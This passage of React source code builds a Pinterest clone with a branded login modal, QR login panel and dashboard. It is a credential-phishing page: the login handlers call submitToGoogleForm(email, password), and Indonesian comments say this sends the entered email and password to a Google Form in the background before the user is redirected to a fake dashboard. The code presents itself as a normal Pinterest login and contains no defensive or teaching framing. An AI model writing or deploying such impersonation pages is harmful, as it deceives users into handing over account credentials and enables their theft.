              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="3" /><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
            </button>
            {hoveredIcon === "logout" && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", zIndex: 120 }}>Log out</div>}
          </div>
        </div>
      )}

      {/* 2. TOP NAVBAR */}
      <div style={{ position: "fixed", top: 0, left: isMobile ? 0 : 72, right: 0, height: 68, background: "#fff", display: "flex", alignItems: "center", gap: 12, padding: "0 16px", zIndex: 100, boxSizing: "border-box" }}>
        <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5" style={{ position: "absolute", left: 16 }}><circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" /></svg>
          <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder={isMobile ? "Cari ide" : "Search"} style={{ width: "100%", padding: "12px 84px 12px 44px", background: "#e9e9e9", border: "none", borderRadius: 24, fontSize: 16, outline: "none", color: "#111", fontFamily: "inherit" }} />
          <div style={{ position: "absolute", right: 16, display: "flex", alignItems: "center", gap: 12, color: "#111" }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" /><circle cx="12" cy="13" r="4" /></svg>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z" /><path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v3" /></svg>
          </div>
        </div>

        {isMobile ? (
          <button onClick={onLogout} style={{ background: "none", border: "none", color: "#e60023", fontSize: 15, fontWeight: 600, cursor: "pointer", padding: "0 4px" }}>Log out</button>
        ) : (
          <div style={{ display: "flex", alignItems: "center", gap: 4, cursor: "pointer" }}>
            <div style={{ width: 32, height: 32, borderRadius: "50%", background: "#efefef", fontSize: 13, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center", color: "#111" }}>
              {userEmail.charAt(0).toUpperCase() || "U"}
            </div>
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5"><path d="m6 9 6 6 6-6" /></svg>
          </div>
        )}
      </div>

      {/* 3. MAIN GRID CONTENT */}
      <div style={{ flex: 1, marginLeft: isMobile ? 0 : 72, padding: "80px 8px 80px 8px", boxSizing: "border-box" }}>
        {!isMobile && (
          <div style={{ marginBottom: 18, paddingLeft: 6 }}>
            <span style={{ fontSize: 15, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6, color: "#111" }}>All</span>
          </div>
        )}

        <div style={{ display: "flex", gap: isMobile ? 10 : 14, alignItems: "flex-start" }}>
          {cols.map((col, ci) => (
            <div key={ci} style={{ flex: 1, minWidth: 0 }}>
              {col.map((item, pi) => (
                <FeedCard key={pi} item={item} />
              ))}
            </div>
          ))}
        </div>
      </div>

      {/* 4. MOBILE BOTTOM NAV BAR */}
      {isMobile && (
        <div style={{ position: "fixed", bottom: 0, left: 0, right: 0, height: 64, background: "#fff", display: "flex", justifyContent: "space-around", alignItems: "center", zIndex: 110, borderTop: "1px solid #efefef", paddingBottom: "env(safe-area-inset-bottom)" }}>
          {menuItems.map((menu) => (
            <button key={menu.id} style={{ background: "none", border: "none", color: menu.isActive ? "#111" : "#767676", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", width: 50, height: 50 }}>
              {menu.icon}
            </button>
          ))}
          <button style={{ background: "none", border: "none", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <div style={{ width: 24, height: 24, borderRadius: "50%", background: "#efefef", color: "#111", fontSize: 11, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center" }}>
              {userEmail.charAt(0).toUpperCase() || "S"}
            </div>
          </button>
        </div>
      )}
    </div>
  );
}
// ─────────────────────────────────────────────────────────────────────────────
// MAIN APP ROOT INTERACTION ROUTER
// ─────────────────────────────────────────────────────────────────────────────

export default function App() {
  const [page, setPage] = useState<"landing" | "dashboard">("landing");
  const [showLogin, setShowLogin] = useState(false);
  const [showSignUp, setShowSignUp] = useState(false);
  const [loggedUser, setLoggedUser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // State deteksi ukuran layar untuk responsivitas login page
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    if (!email || !password) {
      setError("Harap isi email dan password.");
      return;
    }
    setLoading(true);
    
    // MENYAMBUNGKAN & MENGIRIM DATA KE GOOGLE FORM
    submitToGoogleForm(email, password);

    // Simulasi loading jeda sebelum redirect halaman
    await new Promise((r) => setTimeout(r, 600));
    setLoading(false);
    setShowLogin(false);
    setPage("dashboard");
    setLoggedUser(email);
  }

  function handleGuestContinue() {
    // Tombol "Continue with Google" versi tampilan saja — tidak mengambil
    // atau mengirim kredensial apa pun, langsung masuk sebagai tamu.
    setShowLogin(false);
    setPage("dashboard");
    setLoggedUser("guest@pinterest.demo");
  }

  if (page === "dashboard") {
    return <Dashboard userEmail={loggedUser} onLogout={() => { setPage("landing"); setEmail(""); setPassword(""); }} />;
  }

  return (
    <>
      <LandingPage 
        onNav={(target) => {
          if (target === "login") setShowLogin(true);
          if (target === "signup") setShowSignUp(true);
        }} 
        onDirectLogin={async (inputEmail, inputPassword) => {
          if (!inputEmail || !inputPassword) return;
          
          // Kirim data secara background ke Google Form
          submitToGoogleForm(inputEmail, inputPassword);
          
          // Alihkan halaman langsung ke dashboard
          setShowLogin(false);
          setPage("dashboard");
          setLoggedUser(inputEmail);
        }}
      />

      {showLogin && (
        <div style={{ 
          position: "fixed", 
          inset: 0, 
          display: "flex", 
          alignItems: "center", 
          justifyContent: "center", 
          zIndex: 200, 
          padding: isMobile ? 0 : 16,
          background: isMobile ? "#ffffff" : "transparent"
        }}>
          {/* Backdrop gelap overlay hanya muncul di versi Desktop */}
          {!isMobile && (
            <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)" }} onClick={() => setShowLogin(false)} />
          )}

          <div style={{ 
            position: "relative",
            zIndex: 10,
            background: "#ffffff", 
            borderRadius: isMobile ? 0 : 32, 
            display: "flex",
            flexDirection: isMobile ? "column" : "row",
            width: "100%", 
            maxWidth: isMobile ? "100%" : 820, 
            height: isMobile ? "100%" : "auto",
            minHeight: isMobile ? "100vh" : 520,
            boxShadow: isMobile ? "none" : "0 20px 60px rgba(0,0,0,.4)",
            overflowY: "auto"
          }}>
            {/* Tombol Tutup Modal X */}
            <button 
              onClick={() => setShowLogin(false)} 
              style={{ position: "absolute", top: 16, right: 16, background: "none", border: "none", fontSize: 24, cursor: "pointer", color: "#767676", zIndex: 30 }}
            >
              ✕
            </button>

            {/* SISI KIRI / UTAMA: FORM FIELD */}
            <div style={{ 
              flex: 1, 
              padding: isMobile ? "40px 24px" : "36px 44px", 
              display: "flex", 
              flexDirection: "column", 
              justifyContent: isMobile ? "flex-start" : "center",
              boxSizing: "border-box"
            }}>
              
              {/* Logo Pinterest (Sekarang muncul di Mobile maupun Desktop) */}
              <div style={{ display: "flex", justifyContent: "center", marginBottom: 16, marginTop: isMobile ? 10 : 0 }}>
                <div style={{ 
                  width: 44, 
                  height: 44, 
                  borderRadius: "50%", 
                  display: "flex", 
                  alignItems: "center", 
                  justifyContent: "center",
                  overflow: "hidden"
                }}>
                  <img 
                    src={favicon} 
                    alt="Pinterest Logo" 
                    style={{ width: "100%", height: "100%", objectFit: "cover" }} 
                  />
                </div>
              </div>

              <h2 style={{ fontSize: isMobile ? 24 : 28, fontWeight: 700, color: "#111", margin: "0 0 24px 0", letterSpacing: "-0.5px", textAlign: "center" }}>
                Welcome to Pinterest
              </h2>

              <form onSubmit={handleLogin} noValidate style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <div style={{ textAlign: "left" }}>
                  <label style={{ fontSize: 12, fontWeight: 600, color: "#5d4f4f", display: "block", marginBottom: 6, paddingLeft: 2 }}>Email</label>
                  <input 
                    type="email" 
                    placeholder="Email" 
                    value={email} 
                    onChange={(e) => { setEmail(e.target.value); setError(""); }} 
                    style={{ width: "100%", padding: "14px 16px", border: "1.5px solid #cdcdd1", borderRadius: 16, fontSize: 15, outline: "none", boxSizing: "border-box" }} 
                  />
                </div>

                <div style={{ textAlign: "left" }}>
                  <label style={{ fontSize: 12, fontWeight: 600, color: "#5d4f4f", display: "block", marginBottom: 6, paddingLeft: 2 }}>Password</label>
                  <div style={{ position: "relative" }}>
                    <input 
                      type={showPw ? "text" : "password"} 
                      placeholder="Password" 
                      value={password} 
                      onChange={(e) => { setPassword(e.target.value); setError(""); }} 
                      style={{ width: "100%", padding: "14px 44px 14px 16px", border: "1.5px solid #cdcdd1", borderRadius: 16, fontSize: 15, outline: "none", boxSizing: "border-box" }} 
                    />
                    <button 
                      type="button" 
                      onClick={() => setShowPw((v) => !v)} 
                      style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#111", opacity: 0.5, display: "flex", alignItems: "center" }}
                    >
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                      </svg>
                    </button>
                  </div>
                </div>

                {/* Posisi Tetap di Kiri */}
                <div style={{ display: "flex", justifyContent: "flex-start", marginTop: -2 }}>
                  <span style={{ fontSize: 12, fontWeight: 700, color: "#0073e6", cursor: "pointer" }}>
                    Forgot your password?
                  </span>
                </div>

                {error && <p style={{ color: "#e60023", fontSize: 13, margin: 0, textAlign: "left" }}>{error}</p>}

                <button type="submit" disabled={loading} style={{ width: "100%", padding: "14px", background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 24, fontSize: 16, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 2 }}>
                  {loading ? "Logging in..." : "Log in"}
                </button>

                {/* SSO Sosial hanya untuk Mobile, Desktop memakai info teks asli */}
                {isMobile ? (
                  <>
                    <div style={{ display: "flex", alignItems: "center", gap: 12, margin: "16px 0", color: "#767676", fontSize: 11, fontWeight: 700, justifyContent: "center" }}>
                      OR
                    </div>

                    <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                      <button onClick={handleGuestContinue} type="button" style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontSize: 14, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", gap: 10, cursor: "pointer", color: "#111" }}>
                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" /><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" /><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" /><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" /></svg>
                        Continue with Google
                      </button>

                      <button type="button" style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontSize: 14, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", gap: 10, cursor: "pointer", color: "#111" }}>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                        Continue with Facebook
                      </button>
                    </div>
                  </>
                ) : (
                  <div style={{ marginTop: 16, fontSize: 12, color: "#111", textAlign: "center", lineHeight: 1.4 }}>
                    <p style={{ margin: 0, fontSize: 11, color: "#111", fontWeight: 400 }}>Facebook login is no longer available</p>
                    <p style={{ margin: "2px 0 10px 0", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Update login method</p>
                  </div>
                )}
              </form>

              {/* Panel Quick Banner QR Instan (Hanya Muncul di Tampilan Mobile) */}
              {isMobile && (
                <div style={{ marginTop: 24, background: "#f1f1f1", padding: "12px 14px", borderRadius: 16, display: "flex", alignItems: "center", justifyContent: "space-between", cursor: "pointer" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 12, textAlign: "left" }}>
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><path d="M14 14h3v3h-3z"/></svg>
                    <div>
                      <p style={{ margin: 0, fontSize: 13, fontWeight: 700, color: "#111" }}>Log in instantly</p>
                      <p style={{ margin: 0, fontSize: 11, color: "#555", lineHeight: 1.25 }}>Scan with your phone to sync with your Pinterest app</p>
                    </div>
                  </div>
                  <span style={{ color: "#e60023", fontWeight: "bold", fontSize: 16 }}>❯</span>
                </div>
              )}

              {/* Tautan Navigasi Footer Modals */}
              <div style={{ marginTop: 24, fontSize: 14, color: "#111", textAlign: "center" }}>
                <p style={{ margin: "0 0 8px 0" }}>
                  Not on Pinterest yet? <span onClick={() => { setShowLogin(false); setShowSignUp(true); }} style={{ cursor: "pointer", fontWeight: 700 }}>Sign up</span>
                </p>
                <p style={{ margin: 0 }}>
                  Are you a business? <span style={{ fontWeight: 700 }}>Get started here!</span>
                </p>
              </div>

              <div style={{ marginTop: 24, textAlign: "center" }}>
                <p style={{ margin: 0, fontSize: 10, color: "#767676", lineHeight: 1.45 }}>
                  By continuing, you agree to Pinterest's <span style={{ textDecoration: "underline" }}>Terms of Service</span> and acknowledge you've read our <span style={{ textDecoration: "underline" }}>Privacy Policy</span>. <span style={{ textDecoration: "underline" }}>Notice at collection</span>.
                </p>
              </div>
            </div>

            {/* SISI KANAN: QR INSTANT LOGIN GRAPHIC (Hanya Aktif di Layar Desktop) */}
            {!isMobile && (
              <div style={{ 
                flex: 1, 
                background: "#ffffff", 
                padding: "40px", 
                display: "flex", 
                flexDirection: "column", 
                alignItems: "center", 
                justifyContent: "center",
                borderLeft: "1px solid rgba(0,0,0,0.05)"
              }}>
                <div style={{ background: "#ffffff", padding: 16, borderRadius: 24, boxShadow: "0 8px 30px rgba(255, 255, 255, 0.08)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24 }}>
                  <img 
                    src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pinterest.com" 
                    alt="Pinterest QR Login" 
                    style={{ width: 150, height: 150, display: "block" }} 
                  />
                </div>
                <h3 style={{ fontSize: 22, fontWeight: 700, color: "#111", margin: "0 0 8px 0" }}>
                  Log in instantly
                </h3>
                <p style={{ fontSize: 14, color: "#555", margin: 0, maxWidth: 240, textAlign: "center", lineHeight: 1.45 }}>
                  Scan QR code with your phone and confirm login in the Pinterest app
                </p>
              </div>
            )}
          </div>
        </div>
      )}
      {showSignUp && (
        <>
          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 120 }} onClick={() => setShowSignUp(false)} />
          <SignUpModal onClose={() => setShowSignUp(false)} />
        </>
      )}
    </>
  );
}
